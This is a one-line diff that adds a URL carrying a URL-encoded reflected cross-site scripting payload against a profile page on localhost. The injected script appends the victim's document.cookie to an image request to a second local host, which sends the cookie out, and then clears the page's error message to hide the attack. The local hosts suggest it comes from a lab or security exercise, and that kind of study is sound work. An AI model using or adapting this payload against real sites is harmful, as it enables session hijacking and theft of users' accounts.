@@ -1,0 +1,1 @@
+http://localhost:8080/profile/%3Cscript%3Evar%20img%20=%20document.createElement('img');%20img.src%20=%20'//localhost:8081/xss_out%3Fstolen_cookie='+document.cookie;%20document.getElementsByClassName('error')[0].innerHTML%20=%20'';%3C/script%3E
